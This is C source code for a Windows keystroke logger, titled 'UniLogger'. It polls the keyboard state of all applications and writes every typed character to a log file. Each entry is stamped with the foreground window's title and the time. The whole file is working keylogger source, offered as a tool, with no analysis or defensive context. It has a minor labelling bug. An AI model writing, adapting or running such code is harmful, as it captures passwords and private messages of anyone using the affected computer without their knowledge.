#include <Windows.h>
#include <stdio.h>

TCHAR	window_text[1024] = {0};
TCHAR	old_window_text[1024] = {0};
HWND	hWindowHandle;
TCHAR	wszAppName[1024] = {0};
DWORD	dwBytesWritten = 0;
unsigned char header[2] = { 0xFF, 0xFE }; //unicode text file header
HANDLE hFile = INVALID_HANDLE_VALUE;
wchar_t log_file[MAX_PATH] = {0};
SYSTEMTIME LocalTime = {0};

TCHAR *save_log(void) {
	OPENFILENAME    ofn = {0};
	TCHAR filename[512] = {0};
    GetLocalTime(&LocalTime);
	_snwprintf((wchar_t*)filename, 511, L"%04d%02d%02d-%02d%02d%02d.log", LocalTime.wYear, LocalTime.wMonth, LocalTime.wDay, LocalTime.wHour, LocalTime.wMinute, LocalTime.wSecond);

	ofn.lStructSize     = sizeof(ofn);
	ofn.lpstrFilter		= L"Log Files (*.txt,*.log)\0*.TXT;*.LOG\0All Files\0*.*\0";
    ofn.lpstrFile       = filename;
    ofn.nMaxFile        = sizeof(filename);
    ofn.lpstrTitle      = L"UniLogger - Select keylog Location";
    ofn.Flags           = OFN_NONETWORKBUTTON | OFN_OVERWRITEPROMPT | OFN_PATHMUSTEXIST | OFN_LONGNAMES | OFN_EXPLORER | OFN_HIDEREADONLY;
	ofn.nFilterIndex	= 1;
	
    if(!GetSaveFileName(&ofn)) exit(1);
	TCHAR *buff = (TCHAR*)malloc(512);
	ZeroMemory(buff,512);
	memcpy(buff,filename,wcslen(filename) * sizeof(TCHAR));
	return(buff);
}


void WriteToFile(TCHAR *wText)
{
	hFile = CreateFile(log_file, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL);
	WriteFile(hFile, wText, wcslen(wText) * sizeof(wchar_t), &dwBytesWritten, NULL);
	CloseHandle(hFile);
}

void WritesScannedKeyToFile(short sScannedKey)
{
	HKL hkl;
	DWORD dwThreadId;
	DWORD dwProcessId;

	hWindowHandle = GetForegroundWindow();
	dwThreadId = GetWindowThreadProcessId(hWindowHandle, &dwProcessId);
	BYTE *kState = (BYTE*)malloc(256);
	GetKeyboardState(kState);
	hkl = GetKeyboardLayout(dwThreadId);
	wchar_t besmallah[16] = {0};
	UINT virtualKey = MapVirtualKeyEx((UINT)sScannedKey, MAPVK_VK_TO_CHAR, hkl);
	ToUnicodeEx(virtualKey, sScannedKey, (BYTE*)kState, besmallah, 16, NULL, hkl);
	WriteToFile(besmallah);
	//CloseHandle(hkl);
	free(kState);
}

DWORD WINAPI logger(void)
{

	wcscpy_s(log_file, save_log());

	hFile = CreateFile(log_file, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL);
	WriteFile(hFile, header, 2, &dwBytesWritten, NULL);
	CloseHandle(hFile);

	short sScannedKey;
	while(1)
	{
		Sleep((rand() % 50) + 20);
		for(sScannedKey=8;sScannedKey<=222;sScannedKey++)
		{
			if(GetAsyncKeyState(sScannedKey)==-32767)
			{   
				//check window name, has it changed?
				hWindowHandle = GetForegroundWindow();
				if (hWindowHandle != NULL)
				{
					if (GetWindowText(hWindowHandle, window_text, 1024) != 0)
					{
						if (wcscmp(window_text, old_window_text) != 0)
						{
							hFile = CreateFile(log_file, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL);
							GetLocalTime(&LocalTime);
							_snwprintf_s(wszAppName, 1023, L"\n\n{%04d/%02d/%02d %02d:%02d:%02d ", LocalTime.wYear, LocalTime.wMonth, LocalTime.wDay, LocalTime.wHour, LocalTime.wMinute, LocalTime.wSecond);
							wcscat_s(wszAppName, window_text);
							wcscat_s(wszAppName, L"}\n");
							WriteFile(hFile, wszAppName, wcslen(wszAppName) * sizeof(wchar_t), &dwBytesWritten, NULL);
							wcscpy_s(old_window_text, window_text);
							CloseHandle(hFile);
						}
					}
				}

				// end of window name & title check.

				if(true)
				{        
					if((sScannedKey>=39)&&(sScannedKey<91))
					{
						WritesScannedKeyToFile(sScannedKey);
						break;
					}    
					else
					{ 
						switch(sScannedKey)
						{
							//http://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
						case VK_SPACE:
							WriteToFile(L" ");
							break;    
						case VK_SHIFT:
							WriteToFile(L"[SHIFT]");
							break;                                            
						case VK_RETURN:
							WriteToFile(L"\n[ENTER]");
							break;
						case VK_BACK:
							WriteToFile(L"[BACKSPACE]");
							break;
						case VK_TAB:
							WriteToFile(L"[TAB]");
							break;
						case VK_CONTROL:
							WriteToFile(L"[CTRL]");
							break;    
						case VK_DELETE:
							WriteToFile(L"[DEL]");
							break;/*
						case VK_OEM_1:
							WriteToFile(L"[;:]");
							break;
						case VK_OEM_2:
							WriteToFile(L"[/?]");
							break;
						case VK_OEM_3:
							WriteToFile(L"[`~]");
							break;
						case VK_OEM_4:
							WriteToFile(L"[ [{ ]");
							break;
						case VK_OEM_5:
							WriteToFile(L"[\\|]");
							break;                                
						case VK_OEM_6:
							WriteToFile(L"[ ]} ]");
							break;
						case VK_OEM_7:
							WriteToFile(L"['\"]");
							break;*/
						case VK_OEM_PLUS:
							WriteToFile(L"+");
							break;
						case VK_OEM_COMMA:
							WriteToFile(L",");
							break;
						case VK_OEM_MINUS:
							WriteToFile(L"-");
							break;
						case VK_OEM_PERIOD:
							WriteToFile(L".");
							break;
						case VK_NUMPAD0:
							WriteToFile(L"0");
							break;
						case VK_NUMPAD1:
							WriteToFile(L"1");
							break;
						case VK_NUMPAD2:
							WriteToFile(L"2");
							break;
						case VK_NUMPAD3:
							WriteToFile(L"3");
							break;
						case VK_NUMPAD4:
							WriteToFile(L"4");
							break;
						case VK_NUMPAD5:
							WriteToFile(L"5");
							break;
						case VK_NUMPAD6:
							WriteToFile(L"6");
							break;
						case VK_NUMPAD7:
							WriteToFile(L"7");
							break;
						case VK_NUMPAD8:
							WriteToFile(L"8");
							break;
						case VK_NUMPAD9:
							WriteToFile(L"9");
							break;
						case VK_CAPITAL:
							WriteToFile(L"[CAPS LOCK]");
							break;
						case VK_PRIOR:
							WriteToFile(L"[PAGE UP]");
							break;
						case VK_NEXT:
							WriteToFile(L"[PAGE DOWN]");
							break;
						case VK_END:
							WriteToFile(L"[END]");
							break;
						case VK_HOME:
							WriteToFile(L"[HOME]");
							break;
						case VK_LWIN:
							WriteToFile(L"[WIN]");
							break;
						case VK_RWIN:
							WriteToFile(L"[WIN]");
							break;
						case VK_VOLUME_MUTE:
							WriteToFile(L"[SOUND-MUTE]");
							break;
						case VK_VOLUME_DOWN:
							WriteToFile(L"[SOUND-DOWN]");
							break;
						case VK_VOLUME_UP:
							WriteToFile(L"[SOUND-DOWN]");
							break;
						case VK_MEDIA_PLAY_PAUSE:
							WriteToFile(L"[MEDIA-PLAY/PAUSE]");
							break;
						case VK_MEDIA_STOP:
							WriteToFile(L"[MEDIA-STOP]");
							break;
						case VK_MENU:
							WriteToFile(L"[ALT]");
							break;
						default:
							
							break;
						}        
					}    
				}        
			}    
		}                  

	}
	return EXIT_SUCCESS;                            
}                           

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	srand(GetTickCount());
	DWORD nThreadId = 0;
	HANDLE hThreadHandle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)logger, NULL, NULL, &nThreadId);
	WaitForSingleObject(hThreadHandle, INFINITE);
	return 0;
} 